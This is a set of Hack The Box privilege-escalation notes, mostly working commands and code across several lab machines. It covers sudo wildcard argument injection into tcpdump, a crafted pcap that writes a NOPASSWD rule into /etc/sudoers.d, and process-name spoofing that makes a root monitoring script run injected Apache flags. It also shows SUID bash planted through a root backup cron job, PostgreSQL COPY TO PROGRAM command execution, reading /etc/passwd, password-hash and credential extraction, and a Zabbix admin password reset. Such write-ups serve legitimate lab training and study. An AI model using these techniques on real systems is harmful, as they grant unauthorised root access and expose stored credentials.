## Sudo Wildcard Parameter Injection via fnmatch (Dump HTB)

Sudo's `fnmatch()` matches `*` across argument boundaries including spaces, allowing injection of extra flags into a locked-down sudo command.

Example: sudoers rule has `/usr/bin/tcpdump -c10 -w/var/cache/captures/*/[UUID]` — the `*` matches `x -Z root -r/path -w/etc/sudoers.d`

- `-Z root` prevents privilege dropping (file stays root-owned)
- Second `-w` overrides first (tcpdump uses last value)
- `-r` reads from crafted pcap instead of live capture

```bash
sudo /usr/bin/tcpdump -c10 \
  -w/var/cache/captures/x \
  -Z root \
  -r/var/cache/captures/.../crafted.pcap \
  -w/etc/sudoers.d/output_uuid \
  -F/var/cache/captures/filter.uuid
```

**Key insight:** Sudo wildcards use `fnmatch()` without `FNM_PATHNAME`, so `*` matches any characters including spaces and slashes. This means a single `*` in a sudoers rule can match across multiple injected arguments.

## Crafted Pcap for /etc/sudoers.d (Dump HTB)

Sudo's yacc parser has error recovery — it skips binary junk lines and keeps parsing for valid entries. Vixie cron, by contrast, rejects the entire file on the first syntax error. Craft a pcap with an embedded sudoers line: `\nwww-data ALL=(ALL:ALL) NOPASSWD: ALL\n`

Avoid `0x0a` (newline) bytes in binary headers: use IPs like 192.168.x.x (not 10.x.x.x) and select ports/timestamps carefully. The valid sudoers entries appear between binary junk lines.

```python
# Payload embedded in each UDP packet
payload = b"\nwww-data ALL=(ALL:ALL) NOPASSWD: ALL\n"
# Avoid 10.x.x.x IPs (0x0a byte = newline in binary headers)
# Use 192.168.1.1/192.168.1.2, ports 12345/9999, timestamps 100-109
```

**Key insight:** Sudo's parser recovers from errors (yacc `error` productions skip to next newline) while cron's parser rejects the entire file on the first syntax error. This makes `/etc/sudoers.d/` a viable target for binary-format file injection while `/etc/cron.d/` is a dead end.

## Monit confcheck Process Command-Line Injection (Zero HTB)

Monit runs health-check scripts as root every 60 seconds. The script uses `pgrep -lfa` to find processes matching a regex, extracts their command line, modifies it (e.g., replaces `apache2` with `apache2ctl`), and executes the result as root.

Create a fake process with injected extra flags in its command line. Perl's `$0` assignment sets an arbitrary process name visible to `pgrep`:

```bash
# Monit confcheck script pattern:
# pgrep -lfa "^/opt/app/bin/apache2.-k.start.-d./opt/app/conf"
# -> replaces apache2->apache2ctl, appends -t, executes as root

# Inject extra flags via fake process:
perl -e '$0 = "/opt/app/bin/apache2 -k start -d /opt/app/conf -d /dev/shm/malconf -E /dev/shm/malconf/startup.log"; sleep 300' &
```

**Key insight:** When a root script uses `pgrep` to extract a process command line and then executes a modified version, creating a fake process with extra arguments allows injecting flags into root-executed commands. Perl's `$0` or Python's `setproctitle` make process name spoofing trivial.

## Apache -d Last-Wins ServerRoot Override (Zero HTB)

When multiple `-d` flags are specified, Apache uses the last one. Combined with `-E` (startup error log redirect), this provides both config control and output capture. Place `Include /root/root.txt` in a malicious config — Apache tries to parse the flag file as a directive and dumps its content in the error message.

```bash
# Create malicious Apache config
mkdir -p /dev/shm/malconf
cat > /dev/shm/malconf/apache2.conf << 'EOF'
ServerRoot "/etc/apache2"
LoadModule mpm_prefork_module /usr/lib/apache2/modules/mod_mpm_prefork.so
LoadModule authz_core_module /usr/lib/apache2/modules/mod_authz_core.so
Include /root/root.txt
EOF

# Fake process injects -d (override ServerRoot) and -E (error log to readable file)
# After monit triggers confcheck, read error log:
cat /dev/shm/malconf/startup.log
# AH00526: Syntax error on line 1 of /root/root.txt:
# Invalid command 'FLAG_CONTENT_HERE'...
```

**Key insight:** Apache config parse errors expose file content in error messages. `Include /path/to/file` causes Apache to read the file and report its content as an "Invalid command" error — a reliable file-read primitive when combined with `-E` output redirection.

## Backup Cronjob SUID Abuse (Slonik HTB)

Root cronjob copies files from a user-controlled directory (e.g., PostgreSQL data directory). Place a SUID (Set User ID) bash binary in the source directory — when the cronjob copies it, the file becomes root-owned while retaining the SUID bit.

```sql
-- Copy bash with SUID to PostgreSQL data directory
COPY (SELECT '') TO PROGRAM 'cp /bin/bash /var/lib/postgresql/14/main/bash && chmod 4777 /var/lib/postgresql/14/main/bash';
-- After backup cronjob runs, the copy at /opt/backups/current/bash is root-owned SUID
-- Execute: /opt/backups/current/bash -p
```

**Key insight:** When a root cronjob copies an entire directory, file ownership changes to root. SUID binaries in the source become root-owned SUID in the destination. The `-p` flag on bash preserves effective UID.

---

## PostgreSQL COPY TO PROGRAM RCE (Slonik HTB)

PostgreSQL superuser can execute OS commands via `COPY TO PROGRAM`. Read command output by writing to a temp file and using `pg_read_file()`.

```sql
-- Execute commands as postgres user
COPY (SELECT '') TO PROGRAM 'id > /tmp/test.txt';
SELECT pg_read_file('/tmp/test.txt');
-- uid=115(postgres) gid=123(postgres)

-- Read arbitrary files
SELECT pg_read_file('/etc/passwd');
SELECT pg_read_file('/var/lib/postgresql/user.txt');
```

## PostgreSQL Backup Credential Extraction (Slonik HTB)

`pg_basebackup` archives contain password hashes in `pg_authid` (file `global/1260`). SCRAM-SHA-256 hashes (format: `SCRAM-SHA-256$4096:salt$stored_key:server_key`) can be cracked offline. Restore the backup locally with Docker to access full database contents.

```bash
# Mount NFS share, extract backup zip
showmount -e TARGET && mount -t nfs TARGET:/var/backups /mnt
# Extract pg_authid from global/1260 for password hashes
# Restore backup: docker run -v /path/to/backup:/var/lib/postgresql/data postgres:14
# Connect and dump user tables for credentials
```

## SSH Unix Socket Tunneling (Slonik HTB)

When a service only listens on a Unix socket (not TCP), use SSH local port forwarding to tunnel traffic to it. Works even when the user has `/bin/false` as login shell — the `-T -fN` flags skip terminal allocation and command execution.

```bash
# Forward local port 25432 to remote PostgreSQL Unix socket
sshpass -p 'password' ssh -T -o StrictHostKeyChecking=no \
  -fNL 25432:/var/run/postgresql/.s.PGSQL.5432 user@TARGET
# Connect via forwarded port
PGPASSWORD='postgres' psql -h localhost -p 25432 -U postgres
```

**Key insight:** SSH `-L localport:unix_socket_path` forwards to Unix sockets, not just TCP ports. `-T` prevents terminal allocation, `-f` backgrounds SSH, `-N` prevents command execution — together these work even with restricted shells like `/bin/false`.

---

## NFS Share Exploitation for Sensitive Data (Slonik HTB)

Enumerate and mount NFS (Network File System) shares to find database backups, SSH keys, and config files with credentials:
```bash
showmount -e TARGET
# /var/backups (everyone)
# /home        (everyone)
mount -t nfs TARGET:/var/backups /mnt/backups
mount -t nfs TARGET:/home /mnt/home
# Check for: database backups, SSH keys, config files with credentials
```

## PaperCut Print Deploy Privilege Escalation (Bamboo HTB)

Root-owned systemd service (`pc-print-deploy`) runs binaries from a user-owned directory (`/home/papercut/`). The `server-command` shell script, owned by the `papercut` user, executes as root during certain admin operations. Modify this user-owned script to inject a payload, then trigger execution via admin API.

```bash
# Modify user-owned script that root executes
echo 'chmod u+s /bin/bash' >> ~/server/bin/linux-x64/server-command

# Trigger root execution via PaperCut admin API
curl -c /tmp/cookies.txt "http://localhost:9191/app?service=page/SetupCompleted"
curl -b /tmp/cookies.txt "http://localhost:9191/print-deploy/admin/api/mobilityServers/v2?refresh=true"

# Execute SUID bash
bash -p
```

**Key insight:** When a root-owned service runs binaries or scripts from a user-writable directory, check `ls -la` on every file in the execution path. The systemd service file (`/etc/systemd/system/`) defines `ExecStart` but may lack `User=` directive, running everything as root.

---

## Squid Proxy Pivoting to Internal Services (Bamboo HTB)

Route traffic through a Squid proxy to reach internal services not directly accessible:
```bash
# Enumerate internal services through Squid proxy
curl -x http://TARGET:3128 http://127.0.0.1:9191/app
curl -x http://TARGET:3128 http://127.0.0.1:8080/
# Set proxy for all tools:
export http_proxy=http://TARGET:3128
```

## Zabbix Admin Password Reset via MySQL (Watcher HTB)

With MySQL access to the Zabbix database, reset the admin password directly:
```sql
-- Reset Zabbix admin password to "zabbix" (bcrypt hash)
UPDATE users SET passwd = '$2a$10$ZXIvHAEP2ZM.dLXTm6uPHOMVlARXX7cqjbhM6Fn0cANzkCQBWpMrS' WHERE username = 'Admin';
-- Note: username is case-sensitive ("Admin" not "admin")
```

## WinSSHTerm Encrypted Credential Decryption (Atlas HTB)

WinSSHTerm (.NET) stores encrypted SSH credentials in `connections.xml` with key material in a `key` file. Decompile with ILSpy/dnSpy to reverse the multi-layer encryption:

1. **Layer 1:** Key file decrypted with PBKDF2-HMAC-SHA1 (Password-Based Key Derivation Function 2) using 1012 iterations, obfuscated prefix + master password + suffix, and a hardcoded salt
2. **Layer 2:** Decrypted key split into PasswordKey (even bytes, bitwise NOT'd) and SaltKey (odd bytes, NOT'd)
3. **Layer 3:** Stored password decrypted with PBKDF2 derived from PasswordKey/SaltKey
4. Master password often crackable with rockyou.txt
5. XOR obfuscated string table: `data[i] = (data[i] ^ i) ^ 0xAA`

**Key insight:** Desktop SSH clients with "encrypted" credential storage are only as strong as the master password. Decompile the .NET binary, extract the crypto constants, and brute-force the master password. The encryption scheme's complexity is irrelevant if the master password is weak.
